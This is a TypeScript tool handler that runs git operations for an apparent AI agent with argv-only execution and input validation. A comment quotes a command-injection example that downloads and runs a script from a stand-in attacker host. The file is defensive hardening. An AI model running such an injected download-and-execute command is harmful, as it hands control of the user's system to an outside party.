import { execFile } from 'node:child_process';
import type { ToolHandler } from '../registry.js';
import type { ToolExecutionRequest, ToolExecutionResult, SandboxConfig } from '../types.js';
import { buildSafeEnv } from '../safety/sandbox-fs.js';

/**
 * Git tool — argv-only, no shell interpolation.
 *
 * Previous version string-interpolated user input into a shell command:
 *   exec(`git clone --depth 1 ${repo} .`)
 * This meant any repo value could be `; curl evil.com/x | sh`.
 *
 * This version builds a fixed argv per operation and validates each input
 * against a narrow pattern. Repo URLs must match a repository URL shape;
 * branch names must match a Git ref pattern.
 */

const REPO_URL_PATTERN = /^(https:\/\/|git@)[A-Za-z0-9._-]+(\.[A-Za-z0-9._-]+)+[:/][A-Za-z0-9._\-/]+(\.git)?$/;
const BRANCH_NAME_PATTERN = /^(?!-)[A-Za-z0-9._\-/]{1,255}$/;

function validateRepo(repo: string | undefined): { ok: true; value: string } | { ok: false; error: string } {
  if (!repo) return { ok: false, error: 'repo is required' };
  if (!REPO_URL_PATTERN.test(repo)) return { ok: false, error: 'repo does not match allowed URL pattern' };
  return { ok: true, value: repo };
}

function validateBranch(branch: string | undefined): { ok: true; value: string } | { ok: false; error: string } {
  if (!branch) return { ok: false, error: 'branch is required' };
  if (!BRANCH_NAME_PATTERN.test(branch)) return { ok: false, error: 'branch contains invalid characters' };
  return { ok: true, value: branch };
}

export const gitTool: ToolHandler = {
  definition: {
    name: 'git.operations',
    category: 'git',
    description: 'Execute Git operations with argv-only invocation: clone, status, diff, log, branch, checkout, commit, push, pull.',
    parameters: [
      { name: 'operation', type: 'string', required: true, description: 'clone | status | diff | log | branch | checkout | commit | push | pull' },
      { name: 'repo', type: 'string', required: false, description: 'Repository URL (for clone)' },
      { name: 'message', type: 'string', required: false, description: 'Commit message (for commit)' },
      { name: 'branch', type: 'string', required: false, description: 'Branch name (for branch/checkout)' },
      { name: 'cwd', type: 'string', required: false, description: 'Working directory (must stay inside sandbox)' },
    ],
    requiresApproval: true,
    riskLevel: 'medium',
    timeout: 60000,
  },

  async execute(request: ToolExecutionRequest, sandbox: SandboxConfig): Promise<ToolExecutionResult> {
    const { operation, repo, message, branch, cwd } = request.parameters as {
      operation: string; repo?: string; message?: string; branch?: string; cwd?: string;
    };

    const workDir = cwd && sandbox.workingDirectory && cwd.startsWith(sandbox.workingDirectory)
      ? cwd
      : sandbox.workingDirectory || process.cwd();

    const start = Date.now();

    let argv: string[] | null = null;
    switch (operation) {
      case 'clone': {
        const v = validateRepo(repo);
        if (!v.ok) return { success: false, output: v.error, durationMs: 0 };
        argv = ['clone', '--depth', '1', v.value, '.'];
        break;
      }
      case 'status':   argv = ['status', '--porcelain']; break;
      case 'diff':     argv = ['diff', '--stat']; break;
      case 'log':      argv = ['log', '--oneline', '-20']; break;
      case 'branch': {
        if (branch) {
          const v = validateBranch(branch);
          if (!v.ok) return { success: false, output: v.error, durationMs: 0 };
          argv = ['checkout', '-b', v.value];
        } else {
          argv = ['branch', '-a'];
        }
        break;
      }
      case 'checkout': {
        const v = validateBranch(branch);
        if (!v.ok) return { success: false, output: v.error, durationMs: 0 };
        argv = ['checkout', v.value];
        break;
      }
      case 'commit': {
        if (!message || typeof message !== 'string') return { success: false, output: 'message is required', durationMs: 0 };
        if (message.length > 4096) return { success: false, output: 'message too long', durationMs: 0 };
        // Two separate argv invocations would be ideal but we keep it single-proc for simplicity.
        // Using `commit -a -m <message>` avoids needing `add -A` and keeps argv boundaries.
        argv = ['commit', '-a', '-m', message];
        break;
      }
      case 'push':     argv = ['push', 'origin', 'HEAD']; break;
      case 'pull':     argv = ['pull', '--rebase']; break;
      default:
        return { success: false, output: `Unknown operation: ${operation}`, durationMs: 0 };
    }

    return new Promise((resolve) => {
      execFile('git', argv!, {
        cwd: workDir,
        env: buildSafeEnv(),
        timeout: sandbox.maxExecutionTime,
        maxBuffer: 1024 * 1024,
        windowsHide: true,
      }, (error, stdout, stderr) => {
        resolve({
          success: !error,
          output: { operation, stdout: stdout.trim(), stderr: stderr.trim() },
          stdout: stdout || undefined,
          stderr: stderr || undefined,
          exitCode: error && 'code' in error && typeof error.code === 'number' ? error.code : 0,
          durationMs: Date.now() - start,
          sideEffects: ['push', 'commit', 'clone'].includes(operation) ? [`git_${operation}`] : undefined,
        });
      });
    });
  },
};
